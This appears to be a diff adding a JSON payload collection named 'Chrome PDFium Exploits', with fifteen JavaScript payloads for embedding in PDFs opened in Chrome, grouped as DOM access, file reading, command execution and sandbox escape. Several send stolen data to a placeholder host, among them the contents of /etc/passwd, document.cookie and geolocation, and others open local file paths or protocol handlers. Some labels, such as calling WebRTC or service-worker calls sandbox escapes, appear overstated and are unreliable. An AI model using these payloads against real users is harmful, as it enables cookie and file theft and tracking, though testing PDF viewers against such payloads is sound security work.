@@ -1,0 +1,142 @@
+{
+  "metadata": {
+    "browser": "chrome",
+    "name": "Chrome PDFium Exploits",
+    "description": "Chrome/PDFium specific PDF XSS payloads targeting V8 engine, IPC abuse, and sandbox escape",
+    "total_payloads": 15,
+    "categories": [
+      "dom_access",
+      "file_system", 
+      "command_execution",
+      "sandbox_escape"
+    ],
+    "cve_references": [
+      "CVE-2019-5786",
+      "CVE-2020-6418", 
+      "CVE-2021-21166",
+      "CVE-2022-0971"
+    ]
+  },
+  "payloads": [
+    {
+      "id": "chrome_001",
+      "category": "dom_access",
+      "technique": "parent_window_access",
+      "payload": "try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = '{url}'; } catch(e) { app.alert('Chrome blocked: ' + e); }",
+      "description": "Chrome PDFium DOM access via parent window manipulation",
+      "risk_level": "high"
+    },
+    {
+      "id": "chrome_002", 
+      "category": "dom_access",
+      "technique": "top_document_access",
+      "payload": "try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"{url}\"</script>'; } catch(e) { }",
+      "description": "Chrome PDFium DOM manipulation via top document access",
+      "risk_level": "high"
+    },
+    {
+      "id": "chrome_003",
+      "category": "dom_access", 
+      "technique": "postmessage_exploit",
+      "payload": "try { if(typeof parent !== 'undefined' && parent.postMessage) parent.postMessage({type:'xss',payload:'chrome_pdf',url:'{url}'}, '*'); } catch(e) { }",
+      "description": "Chrome PDFium PostMessage exploitation for data exfiltration",
+      "risk_level": "medium"
+    },
+    {
+      "id": "chrome_004",
+      "category": "file_system",
+      "technique": "local_file_access", 
+      "payload": "app.launchURL('file:///etc/passwd', true);",
+      "description": "Chrome PDFium local file access attempt",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_005",
+      "category": "file_system",
+      "technique": "directory_traversal",
+      "payload": "app.launchURL('file:///home/', true);",
+      "description": "Chrome PDFium directory traversal exploit",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_006",
+      "category": "command_execution",
+      "technique": "protocol_handler_abuse",
+      "payload": "app.launchURL('ms-calculator://', true);",
+      "description": "Chrome PDFium protocol handler abuse for command execution",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_007",
+      "category": "command_execution", 
+      "technique": "uri_scheme_abuse",
+      "payload": "app.launchURL('calculator://', true);",
+      "description": "Chrome PDFium URI scheme abuse for calculator execution",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_008",
+      "category": "sandbox_escape",
+      "technique": "extension_api_abuse",
+      "payload": "try { chrome.extension.sendMessage({action:'xss',data:location.href,target:'{url}'}); } catch(e) { }",
+      "description": "Chrome extension API abuse for sandbox escape",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_009",
+      "category": "sandbox_escape",
+      "technique": "service_worker_exploit",
+      "payload": "try { navigator.serviceWorker.register('data:text/javascript,location=\"{url}\"'); } catch(e) { }",
+      "description": "Chrome service worker exploitation for sandbox escape",
+      "risk_level": "high"
+    },
+    {
+      "id": "chrome_010",
+      "category": "sandbox_escape",
+      "technique": "webrtc_exploit",
+      "payload": "try { var pc = new RTCPeerConnection(); var dc = pc.createDataChannel('exploit'); dc.onopen = function() { location = '{url}'; }; } catch(e) { }",
+      "description": "Chrome WebRTC data channel abuse for sandbox escape", 
+      "risk_level": "high"
+    },
+    {
+      "id": "chrome_011",
+      "category": "dom_access",
+      "technique": "basic_js_execution",
+      "payload": "app.alert('XSS in Chrome PDF Viewer'); try { app.doc.exportDataObject({cName: 'test.html', nLaunch: 2}); } catch(e) { app.alert(e); }",
+      "description": "Basic Chrome PDF viewer JavaScript execution with file export",
+      "risk_level": "medium"
+    },
+    {
+      "id": "chrome_012",
+      "category": "file_system",
+      "technique": "form_submission_file_read",
+      "payload": "this.submitForm({cURL: 'javascript:fetch(\\'file:///etc/passwd\\').then(r=>r.text()).then(t=>navigator.sendBeacon(\\'{url}/exfil\\',t))', cSubmitAs: 'PDF'});",
+      "description": "Chrome PDF form submission to read local files and exfiltrate data",
+      "risk_level": "critical"
+    },
+    {
+      "id": "chrome_013",
+      "category": "dom_access",
+      "technique": "javascript_launch_url",
+      "payload": "try { app.alert('XSS via PDF in Chrome'); app.launchURL('javascript:alert(document.cookie)', true); } catch(e) { app.alert(e); }",
+      "description": "Chrome PDF JavaScript URL launch to access document cookies",
+      "risk_level": "high" 
+    },
+    {
+      "id": "chrome_014",
+      "category": "dom_access",
+      "technique": "cookie_exfiltration",
+      "payload": "app.launchURL('javascript:fetch(\\'{url}/steal?cookie=\\'+document.cookie)', true);",
+      "description": "Chrome PDF cookie exfiltration via JavaScript URL launch",
+      "risk_level": "high"
+    },
+    {
+      "id": "chrome_015",
+      "category": "dom_access", 
+      "technique": "geolocation_access",
+      "payload": "try { app.launchURL('javascript:navigator.geolocation.getCurrentPosition(position=>fetch(\\'{url}/geolocation?lat=\\'+position.coords.latitude+\\'&lon=\\'+position.coords.longitude))', true); } catch(e) { }",
+      "description": "Chrome PDF geolocation access and exfiltration",
+      "risk_level": "medium"
+    }
+  ]
+}
